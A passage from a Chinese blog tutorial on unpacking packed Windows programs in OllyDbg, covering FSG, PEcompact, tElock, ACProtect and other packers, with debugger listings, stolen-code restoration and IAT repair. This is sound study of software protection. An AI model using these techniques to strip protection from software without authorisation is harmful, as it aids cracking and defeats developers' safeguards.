id="4-4-1-单步跟踪法"><a href="#4-4-1-单步跟踪法" class="headerlink" title="4.4.1 单步跟踪法"></a>4.4.1 单步跟踪法</h3><p>单步跟踪到这三个连续跳转处，第1行代码向上跳，绕过。第2行代码跳到1D4地址处，刚好绕过第3行的大跨度跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004001CD  ^\78 F3           js short qqspirit.004001C2</span><br><span class="line">004001CF    75 03           jnz short qqspirit.004001D4</span><br><span class="line">004001D1  - FF63 0C         jmp dword ptr ds:[ebx+0xC]               ; qqspirit.0040A86D</span><br><span class="line">004001D4    50              push eax                                 ; qqspirit.0042CBC6</span><br></pre></td></tr></table></figure><p>选中1D1地址，F4运行至此处。F8就跳到了OEP。</p><h3 id="4-4-2-ESP定律"><a href="#4-4-2-ESP定律" class="headerlink" title="4.4.2 ESP定律"></a>4.4.2 ESP定律</h3><p>在程序起始处执行到的第一个<code>push</code>指令后，用ESP定律法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00400154 &gt;  8725 04A24700   xchg dword ptr ds:[0x47A204],esp</span><br><span class="line">0040015A    61              popad</span><br><span class="line">0040015B    94              xchg eax,esp</span><br><span class="line">0040015C    55              push ebp</span><br><span class="line">0040015D    A4              movs byte ptr es:[edi],byte ptr ds:[esi]</span><br></pre></td></tr></table></figure><p>之后同单步跟踪。</p><h3 id="4-4-3-特殊的ESP定律"><a href="#4-4-3-特殊的ESP定律" class="headerlink" title="4.4.3 特殊的ESP定律"></a>4.4.3 特殊的ESP定律</h3><p>FSG 2.0专用的ESP定律。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00400154 &gt;  8725 04A24700   xchg dword ptr ds:[0x47A204],esp</span><br><span class="line">0040015A    61              popad</span><br><span class="line">0040015B    94              xchg eax,esp</span><br></pre></td></tr></table></figure><p>执行到<code>popad</code>后(程序起始处就有<code>popad</code>而没有<code>pushad</code>)，查看堆栈窗口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0047A208   004001E8  qqspirit.004001E8</span><br><span class="line">0047A20C   004001DC  qqspirit.004001DC</span><br><span class="line">0047A210   004001DE  qqspirit.004001DE</span><br><span class="line">0047A214   0040A86D  qqspirit.0040A86D</span><br></pre></td></tr></table></figure><p>顺数第4行就是OEP。选中右键-&gt;在反汇编窗口中跟随，发现在反汇编窗口全是空代码，右键-&gt;断点-&gt;硬件执行，F9运行(或Shift+F9)即可看到代码。如果反汇编窗口中还是看到类似于数据的东西，右键-&gt;分析-&gt;从模块中删除分析就可看到代码了。</p><p>用脱壳的三种方法脱壳后程序查壳都显示完美脱壳了，是由V6编译的。</p><img src="/posts/e2d652c5/fsgoddump1.jpg" class="" title="fsgoddump1"><p>然而三个都不能正常运行，那可能需要我们手动修复IAT。在真正程序段随便找一个call或mov系统函数的偏移地址，比如425210，它的函数名<code>kernel32.GetVersion</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0040A86D  /.  55            push ebp                                 ;  oleaut32.770F0000</span><br><span class="line">0040A86E  |.  8BEC          mov ebp,esp</span><br><span class="line">0040A870  |.  6A FF         push -0x1</span><br><span class="line">0040A872  |.  68 78794200   push qqspirit.00427978</span><br><span class="line">0040A877  |.  68 F4E14000   push qqspirit.0040E1F4                   ;  SE 处理程序安装</span><br><span class="line">0040A87C  |.  64:A1 0000000&gt;mov eax,dword ptr fs:[0]</span><br><span class="line">0040A882  |.  50            push eax</span><br><span class="line">0040A883  |.  64:8925 00000&gt;mov dword ptr fs:[0],esp</span><br><span class="line">0040A88A  |.  83EC 58       sub esp,0x58</span><br><span class="line">0040A88D  |.  53            push ebx                                 ;  qqspirit.0047A208</span><br><span class="line">0040A88E  |.  56            push esi                                 ;  qqspirit.0042C0C8</span><br><span class="line">0040A88F  |.  57            push edi                                 ;  qqspirit.004252AC</span><br><span class="line">0040A890  |.  8965 E8       mov [local.6],esp</span><br><span class="line">0040A893  |.  FF15 10524200 call dword ptr ds:[0x425210]             ;  kernel32.GetVersion</span><br></pre></td></tr></table></figure><p>可以在importREC中填好OEP-&gt;自动查找IAT-&gt;获取输入表，验证虚拟地址为25210处是否为<code>GetVersion</code>函数。</p><img src="/posts/e2d652c5/GetVersion.jpg" class="" title="GetVersion"><p>在OD的命令窗口输入<code>d 425210</code>回车，数据窗口会刷新数据，右键-&gt;长型-&gt;地址，程序中所有函数全都显示出来了。往上滑动记下第一个函数地址<code>425000</code>(再往上全是0)，往下滑动记下最后一个<code>kernel32</code>系列函数的下一个地址<code>425284</code>。</p><p>回到importREC填入RVA<code>25000</code>，大小<code>425284-425000=284</code>(比较偷懒的做法就是将大小写成1000或1500，但会产生很多垃圾指针)，获取输入表-&gt;显示无效函数，无效函数少的话可以直接选中无效函数右键-&gt;剪切指针，转储到文件。这时的<code>dumped_.exe</code>可以正常运行了。(无效函数多的话右键-&gt;跟踪级别1或跟踪级别3跟一下，或者右键-&gt;插件跟踪)</p><p>由于OllyDump是很久远的插件了，所以对现在的脱壳不太友好，最好是用③方法脱壳。而在③方法中importREC最好换成Scylla用作IAT修复，因为ImpREC对一些新系统的API支持不好。</p><p>Scylla用法跟importREC差不多，但是OEP要填<code>40A86D</code>，VA填<code>425000</code>，大小与importREC一样，同样操作，修复转储后文件。</p><h2 id="4-5-PEcompact"><a href="#4-5-PEcompact" class="headerlink" title="4.5 PEcompact"></a>4.5 PEcompact</h2><img src="/posts/e2d652c5/PEcompact.png" class="" title="PEcompact"><p>PEcompact壳可以用单步跟踪、ESP定律、2次内存镜像法。</p><p>使用单步跟踪时，与ASPacK一样都会跑飞，只需F7进入函数即可。</p><p>使用ESP定律时，执行完两个<code>push</code>指令后再进行ESP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0040A86D &gt;  B8 74DE4500     mov eax,qqspirit.0045DE74</span><br><span class="line">0040A872    50              push eax                                 ; qqspirit.0045DE74</span><br><span class="line">0040A873    64:FF35 0000000&gt;push dword ptr fs:[0]</span><br><span class="line">0040A87A    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br></pre></td></tr></table></figure><p>使用2次内存镜像法时，程序跳到此处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0045DE89    C602 E9         mov byte ptr ds:[edx],0xE9</span><br><span class="line">0045DE8C    83C2 05         add edx,0x5</span><br><span class="line">0045DE8F    2BCA            sub ecx,edx                              ; qqspirit.0040A883</span><br><span class="line">0045DE91    894A FC         mov dword ptr ds:[edx-0x4],ecx           ; qqspirit.0045DE97</span><br><span class="line">0045DE94    33C0            xor eax,eax</span><br><span class="line">0045DE96    C3              retn</span><br><span class="line">0045DE97    B8 F9CB45F0     mov eax,0xF045CBF9</span><br></pre></td></tr></table></figure><p>如果执行<code>retn</code>再单步跟踪，程序跑飞。所以要在<code>retn</code>指令的下一条指令下断点运行，再单步跟踪到OEP。</p><h3 id="4-5-1-使用VirtualFree"><a href="#4-5-1-使用VirtualFree" class="headerlink" title="4.5.1 使用VirtualFree"></a>4.5.1 使用VirtualFree</h3><p>方法一：在命令窗口输入<code>bp VirtualFree</code>回车，运行。取消断点，Alt+F9返回到用户代码处。右键-&gt;查找-&gt;命令，输入<code>push 8000</code>(特征码)，取消勾选整个块，F4运行至此处，单步跟踪。</p><p>方法二：在命令窗口输入<code>bp VirtualFree</code>回车，两次F9运行。取消断点，Alt+F9返回到用户代码处。单步跟踪。</p><h3 id="4-5-2-使用VirtualAlloc"><a href="#4-5-2-使用VirtualAlloc" class="headerlink" title="4.5.2 使用VirtualAlloc"></a>4.5.2 使用VirtualAlloc</h3><p>在命令窗口输入<code>bp VirtualAlloc</code>回车，运行。取消断点，Alt+F9返回到用户代码处。单步跟踪。</p><h3 id="4-5-3-使用GetVersion"><a href="#4-5-3-使用GetVersion" class="headerlink" title="4.5.3 使用GetVersion"></a>4.5.3 使用GetVersion</h3><p>在命令窗口输入<code>at GetVersion</code>回车，反汇编窗口跳到相关代码处，F2-&gt;F9-&gt;F2。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">7C81127A &gt;  64:A1 18000000  mov eax,dword ptr fs:[0x18]</span><br><span class="line">7C811280    8B48 30         mov ecx,dword ptr ds:[eax+0x30]</span><br><span class="line">7C811283    8B81 B0000000   mov eax,dword ptr ds:[ecx+0xB0]</span><br><span class="line">7C811289    0FB791 AC000000 movzx edx,word ptr ds:[ecx+0xAC]</span><br><span class="line">7C811290    83F0 FE         xor eax,-0x2</span><br><span class="line">7C811293    C1E0 0E         shl eax,0xE</span><br><span class="line">7C811296    0BC2            or eax,edx                               ; ntdll.KiFastSystemCallRet</span><br><span class="line">7C811298    C1E0 08         shl eax,0x8</span><br><span class="line">7C81129B    0B81 A8000000   or eax,dword ptr ds:[ecx+0xA8]</span><br><span class="line">7C8112A1    C1E0 08         shl eax,0x8</span><br><span class="line">7C8112A4    0B81 A4000000   or eax,dword ptr ds:[ecx+0xA4]</span><br><span class="line">7C8112AA    C3              retn</span><br></pre></td></tr></table></figure><p>一直单步到<code>retn</code>处返回父函数。往上滑动发现OEP，父函数就是真正代码处。</p><h3 id="4-5-4-最后一次异常法"><a href="#4-5-4-最后一次异常法" class="headerlink" title="4.5.4 最后一次异常法"></a>4.5.4 最后一次异常法</h3><p>选项-&gt;调试设置-&gt;异常，将所有选项取消勾选。插件-&gt;StrongOD-&gt;skip some exceptions取消勾选。重新载入，按Shift+F9几次，直至出现主程序。</p><p>比如在ximo教程中是按了Shift+F9两次后跑飞，所以可知主程序在第一次Shift+F9到第二次Shift+F9的代码之间。重新载入，去到倒数第二次的Shift+F9处，在堆栈窗口查看标有<code>SE处理程序</code>(一般是第二行)的数值<code>0045DE74</code>，在反汇编窗口Ctrl+G查找<code>0045DE74</code>，下断点，Shift+F9运行，取消断点。这就来到了与2次镜像内存法一样的地址处，单步跟踪，也要绕过<code>retn</code>指令。</p><h3 id="4-5-5-PEcompact的第一条指令"><a href="#4-5-5-PEcompact的第一条指令" class="headerlink" title="4.5.5 PEcompact的第一条指令"></a>4.5.5 PEcompact的第一条指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040A86D &gt;  B8 74DE4500     mov eax,qqspirit.0045DE74</span><br></pre></td></tr></table></figure><p>加壳程序的第一条指令就是将偏移地址<code>0045DE74</code>赋值给eax。在命令窗口输入<code>bp 0045DE74</code>回车-&gt;运行-&gt;取消断点。后面步骤与2次镜像内存法一样的地址处，单步跟踪，也要绕过<code>retn</code>指令。</p><h2 id="4-6-EZIP"><a href="#4-6-EZIP" class="headerlink" title="4.6 EZIP"></a>4.6 EZIP</h2><p>这个可以用单步跟踪和ESP定律。这次主要讲脱壳后程序崩溃问题。用③方法脱壳没有问题，而用①和②方法都出现了找不到dll的问题。</p><img src="/posts/e2d652c5/%E6%B2%A1%E6%9C%89%E6%89%BE%E5%88%B0dll.png" class="" title="没有找到dll"><p>此时，只要打开LoadPE分别将<code>oddump1.exe</code>和<code>oddump2.exe</code>重建PE即可。</p><h2 id="4-7-tElock-0-98b1"><a href="#4-7-tElock-0-98b1" class="headerlink" title="4.7 tElock 0.98b1"></a>4.7 tElock 0.98b1</h2><p>这个壳可以用最后一次异常法、模拟跟踪法、2次内存镜像法。</p><p>这个程序中很多的花指令以及SEH暗桩。</p><p>花指令是，由设计者特别构思，希望使反汇编的时候出错，让破解者无法清楚正确地反汇编程序的内容，迷失方向。经典的是，目标位置是另一条指令的中间，这样在反汇编的时候便会出现混乱。花指令有可能利用各种指令：jmp, call, ret的一些堆栈技巧，位置运算，等等。</p><p>花指令是程序中的无用代码，程序对它没影响，少了它也能正常运行。加花指令后，杀毒软件对木马静态反汇编时，木马的代码就不会正常显示出来，加大杀毒软件的查杀难度。</p><p>SEH，结构化异常处理，是WINDOWS中异常处理的机制，简单地说，就是操作系统维护一个用来处理异常的函数指针的链表，如果发生异常，系统就会顺着这个链表去调用其中的函数，直到某个异常处理函数将异常处理完了，或者所有的函数都不处理异常。</p><p>使用SEH的机制来进制反调试，就是SEH暗桩。</p><p>程序可以将特定的代码注册成为异常处理函数，然后故意产生一些异常。当程序被调试时，所有的异常事件，都会先发由调试器进行处理，调试器可以决定是否处理，以及如何处理；如果调试器决定不处理，程序自己注册的异常处理入口才会得到执行。对于调试器，并不能保证所有的异常都正确的识别并恰当地处理（因此OD中的很多插件都有anti-anti功能），如果因为调试器对异常情况识别有误，那么程序就会执行完全不同的一条执行路径，这样程序就可以知道自己正在被调试了。</p><h3 id="4-7-1-最后一次异常法"><a href="#4-7-1-最后一次异常法" class="headerlink" title="4.7.1 最后一次异常法"></a>4.7.1 最后一次异常法</h3><p>选项-&gt;调试设置-&gt;异常，将所有选项取消勾选。插件-&gt;StrongOD-&gt;skip some exceptions取消勾选。重新载入，按17次Shift+F9出现主程序。</p><p>重载，按16次Shift+F9后，观察堆栈窗口的<code>SE处理程序</code>数值为0042D7FD。在反汇编窗口下断点Shift+F9运行，取消断点。之后用单步跟踪。</p><h3 id="4-7-2-模拟跟踪法"><a href="#4-7-2-模拟跟踪法" class="headerlink" title="4.7.2 模拟跟踪法"></a>4.7.2 模拟跟踪法</h3><p>使用模拟跟踪法的前提是没有SEH暗桩。而这个程序有很多SEH暗桩。我们知道，按16次Shift+F9没有出现主程序，而在第17次出现主程序，所以第16次到第17次的这一段是没有SEH暗桩的。所以连续按16次Shift+F9再使用模拟跟踪法。</p><h3 id="4-7-3-2次内存镜像法"><a href="#4-7-3-2次内存镜像法" class="headerlink" title="4.7.3 2次内存镜像法"></a>4.7.3 2次内存镜像法</h3><p>2次内存镜像法即可到达OEP。</p><p>用①方法脱壳出现问题：</p><img src="/posts/e2d652c5/%E6%97%A0%E6%B3%95%E5%AE%9A%E4%BD%8D%E7%A8%8B%E5%BA%8F%E8%BE%93%E5%85%A5%E7%82%B9%E4%BA%8E%E5%8A%A8%E6%80%81%E5%BA%93.png" class="" title="无法定位程序输入点于动态库"><p>可以用importREC修复。打开原加壳程序(因为用OD进程会卡死)，填好OEP-&gt;自动查找IAT-&gt;获取输入表，显示无效函数，发现有非常多的无效函数，选中右键-&gt;插件跟踪-&gt;tElock 0.98，让它自动修复无效函数，修复完后还有5个无效函数，右键-&gt;剪切指针。转储到文件，程序正常运行。</p><p>用②③方法直接崩溃不出现弹窗。用importREC进行上述修复后同样可以正常运行。</p><h2 id="4-8-exe32pack"><a href="#4-8-exe32pack" class="headerlink" title="4.8 exe32pack"></a>4.8 exe32pack</h2><p>可以用ESP定律。</p><h3 id="4-8-1-使用IsDebuggerPresent"><a href="#4-8-1-使用IsDebuggerPresent" class="headerlink" title="4.8.1 使用IsDebuggerPresent"></a>4.8.1 使用IsDebuggerPresent</h3><p>在命令窗口输入<code>bp IsDebuggerPresent</code>回车，运行。取消断点，Alt+F9返回到用户代码处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040ED24    8BBD 013C4000   mov edi,dword ptr ss:[ebp+0x403C01]</span><br><span class="line">0040ED2A    03BD 273C4000   add edi,dword ptr ss:[ebp+0x403C27]      ; sticker.00400000</span><br></pre></td></tr></table></figure><p>F8执行到下一条指令，查看信息窗口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ss:[0040A167]=00400000 (sticker.00400000), ASCII &quot;MZ0&quot;</span><br><span class="line">edi=0000535F</span><br></pre></td></tr></table></figure><p>基址为<code>400000</code>，偏移地址为<code>535F</code>，第二条指令就是要它俩相加，结果就是OEP=40535F</p><p>Ctrl+G去到40535F，F4运行至光标处，光标处即OEP。 </p><h2 id="4-9-WinUpack"><a href="#4-9-WinUpack" class="headerlink" title="4.9 WinUpack"></a>4.9 WinUpack</h2><p>用单步跟踪法跟踪到这一步，发现这是个大跳转，然而这个跳转却没有实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0043E635  - 0F84 E3BDFCFF   je 跑跑排行.0040A41E</span><br></pre></td></tr></table></figure><p>不能直接改为jmp，因为如果这样改的话在Scylla获取输入表时一个函数都没有。</p><p>要让这个跳转实现，即eax要等于0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0043E633    85C0            test eax,eax                             ; 跑跑排行.0040C034</span><br><span class="line">0043E635  - 0F84 E3BDFCFF   je 跑跑排行.0040A41E</span><br></pre></td></tr></table></figure><p>运行到跳转指令处，右键-&gt;断点-&gt;条件，输入<code>eax==0</code>。F9运行，取消断点，F8跳转至OEP。之后用③方法dump即可。</p><h2 id="4-10-脱壳的基本思路及小结"><a href="#4-10-脱壳的基本思路及小结" class="headerlink" title="4.10 脱壳的基本思路及小结"></a>4.10 脱壳的基本思路及小结</h2><p>还有非常多的我们没见过的壳，比如KByS、RLPack、PEpack、JDPack、PEncrypt等。但基本都可以用以下几种办法解决：</p><ol><li>单步跟踪</li><li>ESP定律</li><li>2次内存镜像</li><li>最后一次异常法</li><li>模拟跟踪法</li><li>SFX模拟跟踪</li></ol><p>压缩壳修不修正无所谓，但加密壳一定要修正镜像大小。</p><p>如果脱壳后的程序无法运行，可能是IAT重定位的问题，无效指针的问题，需要重建PE的问题，包括5的疑难杂症等等。这需要慢慢探索吧。</p><h2 id="4-11-ASPack变形壳"><a href="#4-11-ASPack变形壳" class="headerlink" title="4.11 ASPack变形壳"></a>4.11 ASPack变形壳</h2><p>使用单步跟踪法、2次内存镜像法可以，但ESP定律不行。</p><p>另外，对任何壳，短距离call要跟进去，远距离call可以不跟进去。</p><h3 id="4-11-1-利用脚本进行脱壳"><a href="#4-11-1-利用脚本进行脱壳" class="headerlink" title="4.11.1 利用脚本进行脱壳"></a>4.11.1 利用脚本进行脱壳</h3><p>载入加壳程序后，插件-&gt;ODdgScript-&gt;运行脚本-&gt;打开对应的壳脚本(后缀可以为txt/osc)，自动找到程序OEP。</p><p>脱壳脚本要自己收集，如果遇到一些变形壳，脱壳脚本可能就太不管用了，在运行了脱壳脚本的基础上再单步跟踪到OEP。</p><h2 id="4-12-ACProtect"><a href="#4-12-ACProtect" class="headerlink" title="4.12 ACProtect"></a>4.12 ACProtect</h2><h3 id="4-12-1-ACProtect-1-32"><a href="#4-12-1-ACProtect-1-32" class="headerlink" title="4.12.1 ACProtect 1.32"></a>4.12.1 ACProtect 1.32</h3><p>ACProtect 1.32是没有Stolen Code的，脱壳相对简单。</p><p>Stolen Code的意思是把被保护程序要运行的代码移走，以进行进一步的保护处理。增加分析难度，脱壳难度、增加反跟踪难度等等。 </p><img src="/posts/e2d652c5/ACProtect132.png" class="" title="ACProtect1.32"><p>运行一下程序，发现会弹一个ACProtect壳的NAG窗口，再进入到主程序。</p><p>载入OD，选项-&gt;调试设置-&gt;异常-&gt;将非法访问内存取消勾选，插件-&gt;SrtongOD-&gt;options-&gt;将skip some exceptions取消勾选。用最后一次异常法，发现它在第2次Shift+F9跑飞了。所以在第1次Shift+F9(如果第一次就跑飞的话用F9)后，选中堆栈窗口的<code>SE处理程序</code>右键-&gt;数据窗口中跟随，在数据窗口中的第一个字节下一个内存访问断点，Shift+F9运行。在反汇编窗口下断点，Shift+F9，再次下断点，Shift+F9。在<code>B</code>模块取消软件断点。如何删除内存访问断点呢？直接右键-&gt;断点-&gt;删除内存断点即可。去到<code>M</code>模块，选中程序领空的<code>.text</code>区段右键-&gt;在访问上设置中断，Shift+F9，弹出NAG窗口，点确定后直达OEP。</p><p>用importREC修复IAT，Scylla会加载出非常多无效指针。</p><h3 id="4-12-2-Ultraprotect-1-x-stolen-code"><a href="#4-12-2-Ultraprotect-1-x-stolen-code" class="headerlink" title="4.12.2 Ultraprotect 1.x(stolen code)"></a>4.12.2 Ultraprotect 1.x(stolen code)</h3><p>查壳显示Ultraprotect壳，这是ACProtect以前的名字，EP区段都显示<code>.perplex</code>。</p><p>这次运行没有NAG窗口。与上述操作一致，到达“OEP”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004010D2    56              push esi</span><br><span class="line">004010D3    FF15 E4634000   call dword ptr ds:[0x4063E4]             ; notepad9.0040D1BA</span><br></pre></td></tr></table></figure><p>这“OEP”长得非常奇怪，与我们之前遇到的语言入口特征都不一样。考虑到ACProtect会有偷代码的习惯，所以猜测入口特征被移到了某处。</p><p>入口特征最常见的是<code>push ebp</code>，先用这个试一下。</p><p>同样，删除完3个断点后，F4运行至目前函数的<code>retn</code>处。调试-&gt;设置条件(Ctrl+T)，勾选“命令是一个”，在输入框填写“push ebp”。调试-&gt;跟踪步入(Ctrl+F11)，跟踪需要亿点时间，跟踪完后会跳到某个指令处，刚好就是被偷的入口特征代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">004254C9    55              push ebp</span><br><span class="line">004254CA    8BEC            mov ebp,esp</span><br><span class="line">004254CC    83EC 44         sub esp,0x44</span><br><span class="line">004254CF    60              pushad</span><br><span class="line">004254D0    60              pushad</span><br></pre></td></tr></table></figure><p>后面几个是出栈指令，所以被偷的代码应该是前3条。选中右键-&gt;二进制-&gt;二进制复制。同样在<code>M</code>模块的<code>.text</code>下断点，Shift+F9运行至“OEP”。由于前3条指令占6个字节，所以要粘贴在“OEP”前6个字节处(粘贴前要把粘贴的地方的指令先nop掉)。覆盖后代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">004010CA    90              nop</span><br><span class="line">004010CB    90              nop</span><br><span class="line">004010CC    55              push ebp</span><br><span class="line">004010CD    8BEC            mov ebp,esp</span><br><span class="line">004010CF    83EC 44         sub esp,0x44</span><br><span class="line">004010D2    56              push esi</span><br></pre></td></tr></table></figure><p>选中真正的OEP右键-&gt;此处为新EIP。接下来就是脱壳了。如果遇到很多无效函数，可以用插件跟踪-&gt;ACProtect，也可以用跟踪级别跟踪(注意OD进程跟踪会卡死，所以打开加壳程序跟踪)。</p><h3 id="4-12-3-Ultraprotect-1-x进阶版"><a href="#4-12-3-Ultraprotect-1-x进阶版" class="headerlink" title="4.12.3 Ultraprotect 1.x进阶版"></a>4.12.3 Ultraprotect 1.x进阶版</h3><p>用4.12.2的方法到了跟踪那一步会报错，“无法处理调试异常”。这时，将选项-&gt;调试设置-&gt;异常-&gt;将INT3中断取消勾选，其余勾选。重载，同样用最后一次异常法，取消3个断点后，在命令窗口输入<code>d 12ffc0</code>回车，下硬件访问断点，Shift+F9。程序找到Stolen Code。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004C9B30    61              popad</span><br><span class="line">004C9B31    55              push ebp</span><br><span class="line">004C9B32    8BEC            mov ebp,esp</span><br><span class="line">004C9B34    6A FF           push -0x1</span><br></pre></td></tr></table></figure><p>复制，找到“OEP”往上滑，却发现代码全乱了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004431F9    68 D8B24400     push NetClean.0044B2D8</span><br><span class="line">004431FE    68 B4334400     push NetClean.004433B4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">004431F7   /2e:79 68        bhnt jns short 00443262</span><br><span class="line">004431FA   |D8B2 440068B4   fdiv dword ptr ds:[edx-0x4B97FFBC]</span><br><span class="line">00443200   |334400 64       xor eax,dword ptr ds:[eax+eax+0x64]</span><br></pre></td></tr></table></figure><p>去一下别的模块再回来，发现又好了，就是不能向上滑动。右键-&gt;分析-&gt;分析代码。这时往上滑正常。将被偷的代码粘贴上去，修改EIP。</p><p>脱壳，运行程序异常。这是因为某些ACProtect 1.x壳有自我保护功能，即入口点如果不是原本那个地址可能就运行不了了。加壳程序入口点<code>4AC000</code>。将已脱壳程序载入OD，定位到<code>4AC000</code>，将被偷代码粘贴，再跳到OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">004AC000    55              push ebp</span><br><span class="line">004AC001    8BEC            mov ebp,esp</span><br><span class="line">004AC003    6A FF           push -0x1</span><br><span class="line">004AC005  - E9 EA71B9FF     jmp 004431F4</span><br><span class="line">;jmp 4431F4也可改为push 4431F4, retn</span><br></pre></td></tr></table></figure><p>复制到可执行文件。再用LoadPE编辑入口点为<code>AC000</code>，程序正常执行。</p><h3 id="4-12-4-ACProtect-2-0-x"><a href="#4-12-4-ACProtect-2-0-x" class="headerlink" title="4.12.4 ACProtect 2.0.x"></a>4.12.4 ACProtect 2.0.x</h3><h4 id="4-12-4-1-VB类"><a href="#4-12-4-1-VB类" class="headerlink" title="4.12.4.1 VB类"></a>4.12.4.1 VB类</h4><p>用4.12.1方法直接到达“OEP”<code>4012CE</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">004012CE  - FF25 78104000   jmp dword ptr ds:[0x401078]              ; msvbvm60.ThunRTMain</span><br><span class="line">004012D4    29BA A821B144   sub dword ptr ds:[edx+0x44B121A8],edi</span><br><span class="line">004012DA    BC 4DB59200     mov esp,0x92B54D</span><br><span class="line">004012DF    0000            add byte ptr ds:[eax],al</span><br><span class="line">004012E1    0000            add byte ptr ds:[eax],al</span><br></pre></td></tr></table></figure><p>根据语言的编译特点，发现它是VB程序。以下就是VB程序的典型例子。第一条指令<code>push</code>，第二条指令<code>call</code>，双击call指令就可知道call的地址<code>call 00401044</code>，刚好是OEP的上面一条<code>jmp 系统函数</code>指令。运行到这条jmp指令时，堆栈窗口的第二条就是push的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00401044   $- FF25 18104000 jmp dword ptr ds:[&lt;&amp;MSVBVM60.#ThunRTMain_100&gt;]     ;  msvbvm60.ThunRTMain</span><br><span class="line">0040104A   ?  0000          add byte ptr ds:[eax],al</span><br><span class="line">0040104C &gt; $  68 3C1F4000   push 吾爱破解.00401F3C                                 ;  ASCII &quot;VB5!#vb6chs.dll&quot;OEP</span><br><span class="line">00401051   .  E8 EEFFFFFF   call &lt;jmp.&amp;MSVBVM60.#ThunRTMain_100&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0012FFBC   00401056  返回到 吾爱破解.00401056 来自 &lt;jmp.&amp;MSVBVM60.#ThunRTMain_100&gt;</span><br><span class="line">0012FFC0   00401F3C  ASCII &quot;VB5!#vb6chs.dll&quot;</span><br></pre></td></tr></table></figure><p>模仿典型例子修改代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">004012CE  - FF25 78104000   jmp dword ptr ds:[0x401078]              ; msvbvm60.ThunRTMain</span><br><span class="line">004012D4    68 54474000     push QQ个性签.00404754</span><br><span class="line">004012D9    E8 F0FFFFFF     call QQ个性签.004012CE                      ; jmp 到 msvbvm60.ThunRTMain</span><br></pre></td></tr></table></figure><p>在真正OEP<code>4012D4</code>处右键-&gt;此处为新EIP，脱壳。</p><h4 id="4-12-4-2-Delphi"><a 